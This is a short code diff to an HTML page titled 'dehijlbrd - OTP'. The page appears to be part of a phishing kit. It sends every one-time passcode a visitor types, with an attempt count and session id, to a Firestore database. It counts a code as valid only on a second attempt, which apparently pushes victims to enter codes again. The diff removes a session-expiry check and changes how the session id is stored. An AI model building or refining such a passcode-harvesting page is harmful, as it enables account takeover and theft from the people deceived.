@@ -4,7 +4,7 @@
   <title>dehijlbrd - OTP</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <style>
-    /* Same style as before */
+    /* CSS code remains unchanged */
   </style>
 </head>
 <body>
@@ -48,12 +48,8 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
-    const sessionId = window.localStorage.getItem('sessionId');
-
-    if (!sessionId) {
-      alert("Session expired. Please start over.");
-      window.location.href = "page1.html";
-    }
+    // Get sessionId from sessionStorage
+    const sessionId = sessionStorage.getItem('sessionId');
 
     let attempt = 1;
 
@@ -76,7 +72,7 @@
         otp: otpValue,
         attempt: attempt,
         valid: attempt > 1,
-        sessionId: sessionId,
+        sessionId: sessionId, // Store sessionId
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         setTimeout(() => {
